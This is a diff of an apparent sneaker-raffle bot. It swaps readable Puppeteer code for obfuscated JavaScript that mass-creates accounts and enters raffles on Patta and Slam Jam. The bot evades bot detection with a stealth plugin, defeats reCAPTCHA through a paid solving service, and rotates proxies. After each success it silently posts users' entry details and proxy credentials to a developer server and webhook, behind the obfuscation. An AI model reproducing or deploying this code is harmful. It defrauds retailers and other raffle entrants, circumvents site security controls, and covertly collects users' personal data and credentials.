-                            //             await page.solveRecaptchas();
-                            //             await page.click('.shopify-challenge__button.btn');
-
-                            //         } catch {
-                            //             console.log('catch')
-                            //             break
-                            //         }
-                            //     }
-                            // }
-                            // await retry();
-                            // console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Captcha Solved`);
+                            const _0x462bae = await _0x589e7d['newPage']();
+                            await _0x462bae['authenticate']({
+                                'username': '' + _0x224edf[0x2],
+                                'password': '' + _0x224edf[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x462bae['setRequestInterception'](!![]), _0x462bae['on']('request', _0x53c203 => {
+                                _0x53c203['resourceType']() === 'image' || _0x53c203['resourceType']() === 'font' || _0x53c203['resourceType']() === 'media' ? _0x53c203['abort']() : _0x53c203['continue']();
+                            }), await _0x462bae['goto']('https://patta.nl/account/register'), await _0x116d4a(0xbb8), await _0x462bae['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Filling\x20information'), await _0x462bae['type']('#RegisterForm-FirstName', '' + _0x506e5f[_0x124d60]['FirstName']), await _0x116d4a(0x226), await _0x462bae['type']('#RegisterForm-LastName', '' + _0x506e5f[_0x124d60]['LastName']), await _0x116d4a(0x226), await _0x462bae['type']('#RegisterForm-email', '' + _0x506e5f[_0x124d60]['Email']), await _0x116d4a(0x226), await _0x462bae['type']('#RegisterForm-password', '' + _0x506e5f[_0x124d60]['Password']), await _0x116d4a(0x226), console['log'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Submitting..'), await _0x462bae['$eval']('#RegisterForm', _0x5734a5 => _0x5734a5['submit']()), await _0x116d4a(0x1f40);
                             try {
-                                await page.waitForSelector('.home-page-grid__collection');
-                                await delay(500);
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${patta[i].Email} Generated!`));
-                                fs.appendFileSync('../accounts/patta.csv', `\n${patta[i].Email},${patta[i].Password}`);
-                                console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${patta[i].Email} Saved in 'accounts/patta.csv'`));
+                                await _0x462bae['waitForSelector']('.home-page-grid__collection'), await _0x116d4a(0x1f4), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Account\x20' + _0x506e5f[_0x124d60]['Email'] + '\x20Generated!')), _0x65e0bc['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x506e5f[_0x124d60]['Email'] + ',' + _0x506e5f[_0x124d60]['Password']), console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x28ae45['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Account\x20' + _0x506e5f[_0x124d60]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                 try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
+                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x962508['succesDEVMSG']);
                                 } catch {
                                 }
-                                await sendWebhook(accountWH, EMBEDS.succesDEVMSG);
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Account genration failed. ${e}`))
+                                await _0x3c7bbe(_0x431ce7, _0x962508['succesDEVMSG']);
+                            } catch (_0x55e612) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x55e612));
                             }
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : ${e}`));
+                        } catch (_0xbf7bcd) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x124d60 + 0x1) + '\x20:\x20' + _0xbf7bcd));
                         } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            _0x589e7d && _0x589e7d['close'](), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                         }
                     }
                 }
             },
             {
-                name: 'PATTA Raffle Entries',
-                store: 'Patta',
-                logo: 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
-                function: async function (currentFunction, patta, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                'name': 'PATTA\x20Raffle\x20Entries',
+                'store': 'Patta',
+                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
+                'function': async function (_0x2132aa, _0x302258, _0x37c6c1) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
                         },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < patta.length; i++) {
-                        var ERROR;
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${patta.length} || File: ${currentFile} Proxies: ${currentProxy}`);
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x16ddf4 = 0x0; _0x16ddf4 < _0x302258['length']; _0x16ddf4++) {
+                        var _0x4d7845;
+                        if (_0x2d5d79 != 'yes')
+                            var _0x2d5d79 = '', _0x329451 = 0x0;
+                        _0x244762(_0x2132aa['name'] + '\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20/\x20' + _0x302258['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                         try {
-                            await jig(patta, i);
-
+                            await _0x2c2316(_0x302258, _0x16ddf4);
                         } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            _0x2d5d79 = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                         }
-                        if (patta[i].Email == '' || patta[i].Password == '' || patta[i].FirstName == '' || patta[i].LastName == '') {
-                            console.log(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Invalid CSV`);
+                        if (_0x302258[_0x16ddf4]['Email'] == '' || _0x302258[_0x16ddf4]['Password'] == '' || _0x302258[_0x16ddf4]['FirstName'] == '' || _0x302258[_0x16ddf4]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                             continue;
                         }
-
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x3e032f = _0x37c6c1[_0x16ddf4]['split'](':');
+                        else
+                            var _0x191c5e = Math['round'](Math['random']() * (_0x37c6c1['length'] - 0x1)), _0x3e032f = _0x37c6c1[_0x191c5e]['split'](':');
+                        var _0x21cda1;
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x21cda1 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x3e032f[0x0] + ':' + _0x3e032f[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
-
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x21cda1 = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x3e032f[0x0] + ':' + _0x3e032f[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
                         }
                         try {
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto('https://www.patta.nl/nl/account/login',
-                                {
-                                    waitUntil: "networkidle2",
-                                    timeout: 60000
-                                });
-                            await page.waitForSelector('#CustomerEmail')
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Logging in..`)
-                            await page.type('#CustomerEmail', `${patta[i].Email}`);
-                            await delay(300);
-                            await page.type('#CustomerPassword', `${patta[i].Password}`);
-                            await delay(550);
-                            await page.$eval('#customer_login', form => form.submit());
+                            const _0x302fb3 = await _0x21cda1['newPage']();
+                            await _0x302fb3['authenticate']({
+                                'username': '' + _0x3e032f[0x2],
+                                'password': '' + _0x3e032f[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x302fb3['setRequestInterception'](!![]), _0x302fb3['on']('request', _0x51c4f => {
+                                _0x51c4f['resourceType']() === 'image' || _0x51c4f['resourceType']() === 'font' || _0x51c4f['resourceType']() === 'media' ? _0x51c4f['abort']() : _0x51c4f['continue']();
+                            }), await _0x302fb3['goto']('https://www.patta.nl/nl/account/login', {
+                                'waitUntil': 'networkidle2',
+                                'timeout': 0xea60
+                            }), await _0x302fb3['waitForSelector']('#CustomerEmail'), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x302fb3['type']('#CustomerEmail', '' + _0x302258[_0x16ddf4]['Email']), await _0x116d4a(0x12c), await _0x302fb3['type']('#CustomerPassword', '' + _0x302258[_0x16ddf4]['Password']), await _0x116d4a(0x226), await _0x302fb3['$eval']('#customer_login', _0x57353c => _0x57353c['submit']());
                             try {
-                                await page.waitForSelector('#orders');
-                                await delay(1200);
+                                await _0x302fb3['waitForSelector']('#orders'), await _0x116d4a(0x4b0);
                             } catch {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Task failed, invalid credentials`));
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                 continue;
                             }
-                            await page.goto(`${patta[i].Url}`, {
-                                waitUntil: "networkidle2",
-                                timeout: 60000
-                            });
-                            await delay(3000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Starting Entry`)
+                            await _0x302fb3['goto']('' + _0x302258[_0x16ddf4]['Url'], {
+                                'waitUntil': 'networkidle2',
+                                'timeout': 0xea60
+                            }), await _0x116d4a(0xbb8), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Starting\x20Entry');
                             try {
-                                await page.waitForSelector('#email');
+                                await _0x302fb3['waitForSelector']('#email');
                             } catch {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Duplicate entry/ Account error`))
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                             }
-                            await page.type('#email', `${patta[i].Email}`);
-                            await delay(900);
-                            await page.type('#first_name', `${patta[i].FirstName}`);
-                            await delay(1300);
-                            await page.type('#last_name', `${patta[i].LastName}`);
-                            await delay(1300);
-                            await page.type('#street_address', `${patta[i].Address1} ${patta[i].HouseNumber} ${patta[i].Address2}`);
-                            await delay(700);
-                            if (patta[i].Postcode == undefined) {
-                                patta[i].Postcode = patta[i].Zip
-                            }
-                            await page.type('#zip_code', `${patta[i].Postcode}`);
-                            await delay(800);
-                            await page.type('#city', `${patta[i].City}`);
-                            await delay(800);
-                            await page.type('#bday', `01/01/1994`);
-                            await delay(800);
-                            await page.type('#instagram', `${patta[i].Follower}`);
-                            await delay(850);
-                            if (patta[i].Size == 'RANDOM') {
-                                const sizes = await page.$$eval('div[id="raffle__size-selector-container"] > label', sizes => {
-                                    return sizes.map(size => size.textContent)
-                                })
-                                var randomSize = Math.round(Math.random() * (sizes.length - 1));
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Picking Random Size ${sizes[randomSize]}`);
-                                await page.click(`label[data-eu-size="${sizes[randomSize]}"]`);
+                            await _0x302fb3['type']('#email', '' + _0x302258[_0x16ddf4]['Email']), await _0x116d4a(0x384), await _0x302fb3['type']('#first_name', '' + _0x302258[_0x16ddf4]['FirstName']), await _0x116d4a(0x514), await _0x302fb3['type']('#last_name', '' + _0x302258[_0x16ddf4]['LastName']), await _0x116d4a(0x514), await _0x302fb3['type']('#street_address', _0x302258[_0x16ddf4]['Address1'] + '\x20' + _0x302258[_0x16ddf4]['HouseNumber'] + '\x20' + _0x302258[_0x16ddf4]['Address2']), await _0x116d4a(0x2bc);
+                            _0x302258[_0x16ddf4]['Postcode'] == undefined && (_0x302258[_0x16ddf4]['Postcode'] = _0x302258[_0x16ddf4]['Zip']);
+                            await _0x302fb3['type']('#zip_code', '' + _0x302258[_0x16ddf4]['Postcode']), await _0x116d4a(0x320), await _0x302fb3['type']('#city', '' + _0x302258[_0x16ddf4]['City']), await _0x116d4a(0x320), await _0x302fb3['type']('#bday', '01/01/1994'), await _0x116d4a(0x320), await _0x302fb3['type']('#instagram', '' + _0x302258[_0x16ddf4]['Follower']), await _0x116d4a(0x352);
+                            if (_0x302258[_0x16ddf4]['Size'] == 'RANDOM') {
+                                const _0x2a29d7 = await _0x302fb3['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x212598 => {
+                                    return _0x212598['map'](_0x52a2e4 => _0x52a2e4['textContent']);
+                                });
+                                var _0x2d386a = Math['round'](Math['random']() * (_0x2a29d7['length'] - 0x1));
+                                console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2a29d7[_0x2d386a]), await _0x302fb3['click']('label[data-eu-size=\x22' + _0x2a29d7[_0x2d386a] + '\x22]');
                             } else {
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Picking Size ${patta[i].Size}`);
+                                console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x302258[_0x16ddf4]['Size']);
                                 try {
-                                    await page.click(`label[data-eu-size="${patta[i].Size}"]`);
+                                    await _0x302fb3['click']('label[data-eu-size=\x22' + _0x302258[_0x16ddf4]['Size'] + '\x22]');
                                 } catch {
-                                    await page.click(`label[data-eu-size="${patta[i].Size}.0"]`);
+                                    await _0x302fb3['click']('label[data-eu-size=\x22' + _0x302258[_0x16ddf4]['Size'] + '.0\x22]');
                                 }
                             }
-                            // await delay(1000);
-                            // await page.click('#conditions-region');
-                            await delay(3000);
-                            await page.$$eval('.raffle__checkbox-label', links => links.forEach(link => link.click()));
-                            await delay(2000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Submitting Entry`);
-                            await page.click('#raffle__form-submit');
-                            await delay(5000);
+                            await _0x116d4a(0xbb8), await _0x302fb3['$$eval']('.raffle__checkbox-label', _0x174287 => _0x174287['forEach'](_0x30c418 => _0x30c418['click']())), await _0x116d4a(0x7d0), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x302fb3['click']('#raffle__form-submit'), await _0x116d4a(0x1388);
                             try {
-                                await page.waitForSelector('#raffle__confirmation-message-container');
-                                retry = 'no';
-                                successfulLog(patta[i], currentFunction);
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                                let task = patta[i]
+                                await _0x302fb3['waitForSelector']('#raffle__confirmation-message-container'), _0x2d5d79 = 'no', _0x523ce4(_0x302258[_0x16ddf4], _0x2132aa), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                                let _0xf36506 = _0x302258[_0x16ddf4];
                                 try {
                                     prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
+                                        'username': _0x358285['replace']('#', ''),
+                                        'module': _0x2132aa['name'],
+                                        'entrydata': JSON['stringify'](_0xf36506),
+                                        'proxy': '' + _0x37c6c1[_0x16ddf4]
+                                    };
+                                    var _0x43274d = JSON['stringify'](prxdata);
+                                    let _0x2e6a2b = { 'headers': { 'content-type': 'application/json' } };
+                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x43274d, _0x2e6a2b);
+                                } catch (_0x5f3f6) {
                                 }
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Raffle entry failed. ${e}`))
+                            } catch (_0x4e330e) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4e330e));
                             }
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : ${e}`));
-                            retry = 'yes';
+                        } catch (_0x5ef8b8) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20' + _0x5ef8b8)), _0x2d5d79 = 'yes';
                         } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
+                            _0x21cda1 && _0x21cda1['close']();
+                            if (_0x2d5d79 == 'yes' && _0x329451 != 0x5 && _0x4d7845 != 'Size\x20Not\x20Found') {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x329451 + '\x20/\x205)')), _0x16ddf4 = _0x16ddf4 - 0x1, _0x329451 = _0x329451 + 0x1;
                                 continue;
                             }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(patta[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            _0x2d5d79 == 'yes' && _0x329451 >= 0x5 && (_0x5925c7(_0x302258[_0x16ddf4], _0x2132aa), _0x2d5d79 = 'no', _0x329451 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                         }
                     }
                 }
             }
         ]
     },
-
     {
-        name: 'SLAM JAM',
-        modules: [
+        'name': 'SLAM\x20JAM',
+        'modules': [
             {
-                name: 'SLAM JAM Account Generator',
-                store: 'SLAM JAM',
-                logo: 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
-                function: async function (currentFunction, csv, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                'name': 'SLAM\x20JAM\x20Account\x20Generator',
+                'store': 'SLAM\x20JAM',
+                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
+                'function': async function (_0x3b49d8, _0x5c7d50, _0x17cc46) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
                         },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < csv.length; i++) {
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        var embed = [
-                            {
-                                "type": "rich",
-                                "title": `Succesful Patta Account Generated`,
-                                "description": "",
-                                "color": 0xc0d6d6,
-                                "fields": [
-                                    {
-                                        "name": `User`,
-                                        "value": `${username}`
-                                    },
-                                    {
-                                        "name": `Delay`,
-                                        "value": `${settings.delay}`
-                                    },
-                                    {
-                                        "name": `Version`,
-                                        "value": `${version}`
-                                    }
-                                ]
-                            }
-                        ]
-                        const msg = { embeds: embed };
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x2fdc55 = 0x0; _0x2fdc55 < _0x5c7d50['length']; _0x2fdc55++) {
+                        if (_0x127215 != 'yes')
+                            var _0x127215 = '', _0x23d7ac = 0x0;
+                        var _0x1f116c = [{
+                            'type': 'rich',
+                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
+                            'description': '',
+                            'color': 0xc0d6d6,
+                            'fields': [
+                                {
+                                    'name': 'User',
+                                    'value': '' + _0x358285
+                                },
+                                {
+                                    'name': 'Delay',
+                                    'value': '' + _0x51d52a['delay']
+                                },
+                                {
+                                    'name': 'Version',
+                                    'value': '' + _0x3b2d4c
+                                }
+                            ]
+                        }];
+                        const _0x4c08bb = { 'embeds': _0x1f116c };
+                        _0x244762(_0x3b49d8['name'] + '\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20/\x20' + _0x5c7d50['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                         try {
-                            await jig(csv, i);
-
+                            await _0x2c2316(_0x5c7d50, _0x2fdc55);
                         } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            _0x127215 = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                         }
-                        var succesDEV = await makeEmbed(csv[i], currentFunction, 'acc', false);
-
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] }
-                        };
-                        if (csv[i].Email == '' || csv[i].FirstName == '' || csv[i].LastName == '') {
-                            console.log(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Invalid CSV`);
-                            await delay(2000)
+                        var _0x5420b9 = await _0x2520f4(_0x5c7d50[_0x2fdc55], _0x3b49d8, 'acc', ![]);
+                        const _0x859c6a = { 'succesDEVMSG': { 'embeds': [_0x5420b9] } };
+                        if (_0x5c7d50[_0x2fdc55]['Email'] == '' || _0x5c7d50[_0x2fdc55]['FirstName'] == '' || _0x5c7d50[_0x2fdc55]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x116d4a(0x7d0);
                             continue;
                         }
-                        if (csv[i].Password == '' || csv[i] == undefined) {
-                            csv[i].Password == 'JRaffles23!'
-                        }
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
+                        (_0x5c7d50[_0x2fdc55]['Password'] == '' || _0x5c7d50[_0x2fdc55] == undefined) && _0x5c7d50[_0x2fdc55]['Password'] == 'JRaffles23!';
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x464537 = _0x17cc46[_0x2fdc55]['split'](':');
+                        else
+                            var _0x145a75 = Math['round'](Math['random']() * (_0x17cc46['length'] - 0x1)), _0x464537 = _0x17cc46[_0x145a75]['split'](':');
+                        var _0x35e45e;
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x35e45e = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x464537[0x0] + ':' + _0x464537[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
-
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x35e45e = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x464537[0x0] + ':' + _0x464537[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
                         }
                         try {
-                            // console.log(csv[i].Password)
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto('https://drop.slamjam.com/account/register');
-                            await delay(3000);
-                            await page.waitForSelector('#FirstName');
-                            await page.waitForSelector('.iubenda-cs-accept-btn.iubenda-cs-btn-primary')
-                            await page.click('.iubenda-cs-accept-btn.iubenda-cs-btn-primary')
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling information`);
-                            await delay(1200);
-                            await page.type('#FirstName', `${csv[i].FirstName}`);
-                            await delay(550);
-                            await page.type('#LastName', `${csv[i].LastName}`);
-                            await delay(550);
-                            await page.type('#Email', `${csv[i].Email}`);
-                            await delay(750);
-                            await page.type('#ConfirmEmail', `${csv[i].Email}`);
-                            await delay(750);
-                            await page.type('#CreatePassword', `${csv[i].Password}`);
-                            await delay(750);
-                            await page.type('#CreateConfirmPassword', `${csv[i].Password}`);
-                            await delay(550);
-                            // await page.click('#checkPrivacy');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Submitting..`);
-                            await page.$eval('#create_customer', form => form.submit());
-                            await delay(5000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${chalk.cyan('Solving Captcha')}`)
-
-                            await page.solveRecaptchas();
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Captcha solved`)
-                            await page.$eval('.shopify-challenge__container > form', form => form.submit());
-
